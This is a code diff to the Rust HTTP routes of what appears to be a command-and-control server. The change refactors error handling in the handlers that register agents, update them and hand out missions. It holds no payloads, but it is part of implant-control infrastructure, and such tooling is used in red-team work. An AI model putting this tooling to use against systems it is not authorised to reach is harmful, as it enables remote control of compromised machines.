@@ -11,6 +11,7 @@ use tracing::{debug, error, warn};
 use crate::{services, C2State};
 
 // TODO Either encrypt all routes or listen on a different interface for admin routes
+// TODO Try to propagate errors using impl IntoResponse for better error handling
 
 pub fn init_router() -> Router<C2State> {
     Router::new()
@@ -50,10 +51,14 @@ async fn get_crypto(
                 c2_state.conn.clone(),
                 crypto_negociation.identity.to_bytes(),
             ) {
-                Some(agent) => agent,
-                None => {
+                Ok(Some(agent)) => agent,
+                Ok(None) => {
                     warn!("Agent not found");
                     return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
+                }
+                Err(e) => {
+                    error!("{e}");
+                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
                 }
             }
         }
@@ -117,7 +122,7 @@ mod agents {
         Path(agent_id): Path<i32>,
         _bin: Bytes,
     ) -> impl IntoResponse {
-        if services::agents::get_by_id(c2_state.conn.clone(), agent_id).is_none() {
+        let Ok(Some(_)) = services::agents::get_by_id(c2_state.conn.clone(), agent_id) else {
             return (StatusCode::NOT_FOUND).into_response();
         };
         if let Err(e) =
@@ -135,16 +140,24 @@ mod agents {
         agent_json: String,
     ) -> impl IntoResponse {
         let agent_json: serde_json::Value = serde_json::from_str(&agent_json).unwrap();
-        if let Some(agent) = services::agents::get_by_id(c2_state.conn.clone(), agent_id) {
-            match services::agents::update_by_id(c2_state.conn.clone(), &agent.merge(agent_json)) {
-                Ok(agent) => (StatusCode::OK, Json(Some(agent))).into_response(),
-                Err(e) => {
-                    error!("{e}");
-                    (StatusCode::INTERNAL_SERVER_ERROR).into_response()
+        match services::agents::get_by_id(c2_state.conn.clone(), agent_id) {
+            Ok(Some(agent)) => {
+                match services::agents::update_by_id(
+                    c2_state.conn.clone(),
+                    &agent.merge(agent_json),
+                ) {
+                    Ok(agent) => (StatusCode::OK, Json(Some(agent))).into_response(),
+                    Err(e) => {
+                        error!("{e}");
+                        (StatusCode::INTERNAL_SERVER_ERROR).into_response()
+                    }
                 }
             }
-        } else {
-            (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response()
+            Ok(None) => (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response(),
+            Err(e) => {
+                error!("{e}");
+                (StatusCode::INTERNAL_SERVER_ERROR).into_response()
+            }
         }
     }
 }
@@ -179,33 +192,44 @@ mod missions {
             return (StatusCode::UNAUTHORIZED).into_response();
         }
 
-        let agent = if let Some(agent) = services::agents::get_by_identity(
+        let agent = match services::agents::get_by_identity(
             c2_state.conn.clone(),
             crypto_negociation.identity.to_bytes(),
         ) {
-            agent
-        } else {
-            match services::agents::create(
-                c2_state.conn.clone(),
-                "Unnamed agent",
-                crypto_negociation.identity.to_bytes(),
-                headers
-                    .get(PLATFORM_HEADER)
-                    .and_then(|p| model::Platform::from_str(p.to_str().unwrap()).ok())
-                    .unwrap_or(model::Platform::Unix),
-            ) {
-                Ok(agent) => agent,
-                Err(e) => {
-                    error!("{e}");
-                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+            Ok(Some(agent)) => agent,
+            Ok(None) => {
+                match services::agents::create(
+                    c2_state.conn.clone(),
+                    "Unnamed agent",
+                    crypto_negociation.identity.to_bytes(),
+                    headers
+                        .get(PLATFORM_HEADER)
+                        .and_then(|p| model::Platform::from_str(p.to_str().unwrap()).ok())
+                        .unwrap_or(model::Platform::Unix),
+                ) {
+                    Ok(agent) => agent,
+                    Err(e) => {
+                        error!("{e}");
+                        return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+                    }
                 }
+            }
+            Err(e) => {
+                error!("{e}");
+                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
             }
         };
 
-        let Some(mission) = services::missions::poll_next(c2_state.conn.clone(), agent.id).await
-        else {
-            debug!("No mission for agent {}", agent.id);
-            return (StatusCode::NO_CONTENT).into_response();
+        let mission = match services::missions::poll_next(c2_state.conn.clone(), agent.id).await {
+            Ok(Some(m)) => m,
+            Ok(None) => {
+                debug!("No mission for agent {}", agent.id);
+                return (StatusCode::NO_CONTENT).into_response();
+            }
+            Err(e) => {
+                error!("{e}");
+                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+            }
         };
 
         // TODO Create a proper to store & deliver agent versions
@@ -280,9 +304,15 @@ mod missions {
             }
         };
 
-        let Some(agent) = services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id)
-        else {
-            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
+        let agent = match services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id) {
+            Ok(Some(agent)) => agent,
+            Ok(None) => {
+                return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
+            }
+            Err(e) => {
+                error!("{e}");
+                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+            }
         };
 
         if let Err(e) =
